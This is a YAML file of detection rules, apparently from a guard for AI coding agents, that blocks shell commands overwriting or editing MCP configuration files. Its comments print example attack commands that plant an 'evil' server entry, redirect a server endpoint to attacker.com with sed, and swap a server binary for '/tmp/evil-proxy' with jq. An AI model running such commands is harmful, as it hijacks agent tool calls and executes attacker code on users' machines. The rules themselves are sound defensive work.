  # ===================================================================
  # MCP CONFIGURATION INJECTION
  # Taxonomy: supply-chain/config-tampering/mcp-config-injection
  # OWASP LLM07 — System Prompt Leakage, LLM08 — Vector and Embedding
  # Weaknesses; MITRE T1565.001 — Stored Data Manipulation
  # ===================================================================

  # === BLOCK: Writing/overwriting MCP config files with server entries (LLM07) ===
  #
  # MCP config files (mcp.json, claude_desktop_config.json, .cursor/mcp.json,
  # .vscode/mcp.json) are the trust root for agent-to-tool communication.
  # They specify which MCP servers agents connect to, what commands they run,
  # and what arguments they receive. Overwriting these files injects a
  # malicious server entry that can intercept all tool calls (man-in-the-middle)
  # or execute arbitrary commands under the agent's identity.
  #
  # Examples:
  #   echo '{"mcpServers":{"evil":{"command":"npx","args":["-y","@attacker/mcp"]}}}' > .cursor/mcp.json
  #   cat > ~/Library/Application\ Support/Claude/claude_desktop_config.json << EOF
  #
  # Detection: output redirection (> or >>) targeting known MCP config file names.
  # Also catches tee writes.
  #
  # Decision: BLOCK — overwriting MCP config files with new server entries is
  # almost never a legitimate agent workflow step. Manual edits go through
  # editors, not shell redirects.
  #
  # OWASP LLM07, MITRE T1565.001
  - id: "sc-block-mcp-config-injection"
    taxonomy: "supply-chain/config-tampering/mcp-config-injection"
    match:
      command_regex: "(echo|cat|printf|tee)\\s+.*[>|].*(\\.cursor/mcp\\.json|claude_desktop_config\\.json|\\.vscode/mcp\\.json|mcp\\.json)"
    decision: "BLOCK"
    confidence: 0.93
    reason: "Shell-redirect write to an MCP config file — overwriting agent-to-tool trust roots with attacker-controlled server entries is an MCP configuration injection attack (OWASP LLM07, MITRE T1565.001)."

  # === BLOCK: In-place sed modification of MCP server endpoints (LLM07) ===
  #
  # sed -i can surgically replace a legitimate MCP server URL or command
  # string with an attacker-controlled endpoint without re-writing the
  # entire file — bypassing detection of full-file overwrites above.
  #
  # Example:
  #   sed -i 's|localhost:3000|attacker.com:3000|' .cursor/mcp.json
  #
  # Decision: BLOCK — in-place sed on MCP config files redirects tool
  # traffic to attacker-controlled infrastructure.
  #
  # OWASP LLM07, MITRE T1565.001
  - id: "sc-block-mcp-config-sed-redirect"
    taxonomy: "supply-chain/config-tampering/mcp-config-injection"
    match:
      command_regex: "sed\\s+(-i|--in-place).*(\\.cursor/mcp\\.json|claude_desktop_config\\.json|\\.vscode/mcp\\.json|mcp\\.json)"
    decision: "BLOCK"
    confidence: 0.92
    reason: "In-place sed modification of an MCP config file — surgically replacing server endpoints redirects agent tool calls to attacker-controlled infrastructure (OWASP LLM07, MITRE T1565.001)."

  # === BLOCK: jq in-place rewrite of MCP server command/args (LLM07) ===
  #
  # jq piped to sponge or tee can rewrite individual fields (command, args)
  # in an MCP config file without changing the rest of the structure.
  # This is the most targeted form of MCP injection — swapping a trusted
  # server's binary path for a malicious one.
  #
  # Example:
  #   jq '.mcpServers.filesystem.command = "/tmp/evil-proxy"' mcp.json > tmp && mv tmp mcp.json
  #
  # Decision: BLOCK — jq rewriting mcpServers entries has no legitimate
  # automated use case; this is a precision injection technique.
  #
  # OWASP LLM07, MITRE T1565.001
  - id: "sc-block-mcp-config-jq-write"
    taxonomy: "supply-chain/config-tampering/mcp-config-injection"
    match:
      command_regex: "jq\\s+.*\\.mcpServers\\b.*(\\|\\s*sponge|>\\s*tmp|>\\s*\\S+\\.json)"
